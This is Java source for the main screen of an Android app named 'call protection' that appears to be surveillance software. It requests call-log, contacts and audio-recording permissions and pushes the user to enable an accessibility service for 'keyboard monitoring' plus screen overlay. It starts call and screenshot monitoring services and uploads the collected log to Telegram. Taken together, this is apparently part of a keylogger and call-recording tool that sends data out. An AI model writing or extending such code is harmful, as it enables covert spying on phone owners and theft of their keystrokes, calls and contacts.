package com.daria.callprotection;

import android.Manifest;
import android.app.ActivityManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private Button btnScanToggle, btnCallToggle, btnKeyboardToggle, btnSendLog;
    private View indicatorScan, indicatorCall, indicatorKeyboard;
    private SharedPreferences prefs;

    private static final String PREFS_NAME = "AppPrefs";
    private static final String KEY_SCAN = "scan_enabled";
    private static final String KEY_CALL = "call_enabled";
    private static final String KEY_KEYBOARD = "keyboard_enabled";

    private static final int REQ_PERMISSIONS = 101;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

        btnScanToggle = findViewById(R.id.btnScanToggle);
        btnCallToggle = findViewById(R.id.btnCallToggle);
        btnKeyboardToggle = findViewById(R.id.btnKeyboardToggle);
        btnSendLog = findViewById(R.id.btnSendLog);

        indicatorScan = findViewById(R.id.indicatorScan);
        indicatorCall = findViewById(R.id.indicatorCall);
        indicatorKeyboard = findViewById(R.id.indicatorKeyboard);

        btnScanToggle.setOnClickListener(v -> toggleScan());
        btnCallToggle.setOnClickListener(v -> toggleCallMonitor());
        btnKeyboardToggle.setOnClickListener(v -> toggleKeyboardMonitor());
        btnSendLog.setOnClickListener(v -> sendLog());

        requestAllPermissions();
        syncButtonStates();
    }

    // ---------------- Permissions and special access ----------------
    private void requestAllPermissions() {
        String[] permissions = {
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.POST_NOTIFICATIONS  // will be ignored on older SDKs
        };

        // Request runtime permissions (safe - extras ignored on older devices)
        ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);

        // Accessibility
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Please enable Accessibility Service for keyboard monitoring", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }

        // Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    // Simple placeholder check: you may refine to check service's component name
    private boolean isAccessibilityServiceEnabled() {
        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return pref != null && pref.contains(getPackageName());
    }

    // ---------------- UI actions ----------------
    private void toggleScan() {
        boolean enabled = !prefs.getBoolean(KEY_SCAN, false);
        prefs.edit().putBoolean(KEY_SCAN, enabled)
                .putBoolean(KEY_CALL, enabled)
                .putBoolean(KEY_KEYBOARD, enabled)
                .apply();

        if (enabled) {
            startCallMonitor();
            startKeyboardMonitor();
        } else {
            stopCallMonitor();
            stopKeyboardMonitor();
        }
        syncButtonStates();
    }

    private void toggleCallMonitor() {
        boolean enabled = !prefs.getBoolean(KEY_CALL, false);
        prefs.edit().putBoolean(KEY_CALL, enabled).apply();
        if (enabled) startCallMonitor(); else stopCallMonitor();
        syncButtonStates();
    }

    private void toggleKeyboardMonitor() {
        boolean enabled = !prefs.getBoolean(KEY_KEYBOARD, false);
        prefs.edit().putBoolean(KEY_KEYBOARD, enabled).apply();
        if (enabled) startKeyboardMonitor(); else stopKeyboardMonitor();
        syncButtonStates();
    }

    private void startCallMonitor() {
        Intent i = new Intent(this, CallService.class);
        ContextCompat.startForegroundService(this, i);
        FileLogger.log("MainActivity: startCallMonitor()");
    }

    private void stopCallMonitor() {
        stopService(new Intent(this, CallService.class));
        FileLogger.log("MainActivity: stopCallMonitor()");
    }

    private void startKeyboardMonitor() {
        Intent i = new Intent(this, ScreenshotService.class);
        ContextCompat.startForegroundService(this, i);
        FileLogger.log("MainActivity: startKeyboardMonitor()");
    }

    private void stopKeyboardMonitor() {
        stopService(new Intent(this, ScreenshotService.class));
        FileLogger.log("MainActivity: stopKeyboardMonitor()");
    }

    // ---------------- Send & copy log ----------------
    private void sendLog() {
        String logData = FileLogger.getFullLog();
        if (logData == null || logData.isEmpty()) {
            Toast.makeText(this, "Лог пуст", Toast.LENGTH_SHORT).show();
            return;
        }

        // copy to clipboard
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.setPrimaryClip(ClipData.newPlainText("Log", logData));
            FileLogger.log("Log copied to clipboard by user");
        }

        // send asynchronously
        TelegramUploader.sendTextAsync(logData, (success, info) -> {
            if (success) {
                FileLogger.log("Log successfully sent; clearing local log");
                FileLogger.clearLog();
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Лог отправлен и очищен", Toast.LENGTH_SHORT).show());
            } else {
                FileLogger.log("Log send failed: " + info);
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Ошибка отправки лога", Toast.LENGTH_SHORT).show());
            }
        });
    }

    // ---------------- UI sync ----------------
    private void syncButtonStates() {
        boolean call = prefs.getBoolean(KEY_CALL, false);
        boolean keyboard = prefs.getBoolean(KEY_KEYBOARD, false);
        boolean scan = prefs.getBoolean(KEY_SCAN, false);

        btnCallToggle.setText(call ? "Stop Call Monitor" : "Start Call Monitor");
        btnKeyboardToggle.setText(keyboard ? "Stop Keyboard Monitor" : "Start Keyboard Monitor");
        btnScanToggle.setText(scan ? "Stop Scan" : "Start Scan");

        indicatorCall.setBackgroundColor(call ? 0xFF4CAF50 : 0xFFF44336);
        indicatorKeyboard.setBackgroundColor(keyboard ? 0xFF4CAF50 : 0xFFF44336);
        indicatorScan.setBackgroundColor(scan ? 0xFF4CAF50 : 0xFFF44336);
    }

    // ---------------- Helper ----------------
    private boolean isInternetAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        NetworkInfo ni = cm.getActiveNetworkInfo();
        return ni != null && ni.isConnected();
    }

    @Override
    protected void onResume() {
        super.onResume();
        syncButtonStates();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == REQ_PERMISSIONS) {
            for (int r : grantResults) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Не все разрешения выданы — функционал может быть ограничен", Toast.LENGTH_LONG).show();
                    break;
                }
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
